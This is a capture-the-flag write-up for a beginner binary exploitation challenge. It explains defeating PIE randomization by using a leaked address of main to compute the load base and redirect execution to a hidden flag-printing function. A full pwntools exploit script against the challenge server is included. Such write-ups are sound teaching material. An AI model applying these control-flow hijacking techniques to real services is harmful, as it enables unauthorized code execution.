# jumPIEng

**Category:** Binary Exploitation

Harry, a rookie in the realm of Capture The Flag competitions, has just begun exploring the intricacies of binary exploitation—specifically the concept of Position-Independent Executables (**PIE**). Convinced that PIE makes the binary unbreakable if any addresses are discovered, Harry challenges us to extract the flag from his program, which only leaks the runtime address of `main`. Let's prove him wrong!

nc 34.131.133.224 12346
---

## Challenge

**Provided File:** redirection


---

## Overview

1. **PIE & Address Leaks**  
   PIE randomizes the load address of the binary each time it runs. However, if you can obtain **any** function’s runtime address (like `main`), you can compute the program's **base address**.

2. **Leveraging the Main Address**  
   The challenge conveniently prints the runtime address of `main`. By subtracting the known offset of `main` in the ELF file, we can calculate the **base address** where the binary is loaded.

3. **Redirecting Execution**  
   The binary has a hidden or unreferenced function named `redirect_to_success`. Once we know the base address, we can compute where `redirect_to_success` lives in memory and redirect the program flow to it, thereby triggering the flag-print routine.

---

## Steps to Exploit

1. **Receive the Leaked Main Address**  
   - The remote program prints the address of `main`. Parse this value.

2. **Calculate the Base Address**  
   - Subtract the known offset (ELF symbol) of `main` from the leaked address:
     ```python
     base_address = leaked_main - e.symbols['main']
     ```

3. **Compute the Flag Function Address**  
   - Add the offset of `redirect_to_success` to the base address:
     ```python
     redirect_address = base_address + e.symbols['redirect_to_success']
     ```

4. **Jump to Flag Function**  
   - Send the computed address back to the challenge service, causing the program to execute the flag-printing function.

---

## Exploit Script

```python
from pwn import *

binary = './redirection'
context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
r = remote('34.131.133.224', 12346)  # Connect to the challenge server

# Step 1: Receive the main address
r.recvuntil('Main function address: ')
main_leaked = r.recvline()
main_leaked = int(main_leaked, 16)

# Step 2: Calculate base address
base_address = main_leaked - e.symbols['main']
log.info(f'Base address: {hex(base_address)}')

# Step 3: Compute the address of the "redirect_to_success" function
redirect_address = base_address + e.symbols['redirect_to_success']
log.info(f'Redirect address: {hex(redirect_address)}')

# Step 4: Send the address to redirect the program's execution
r.sendline(hex(redirect_address))
r.interactive()
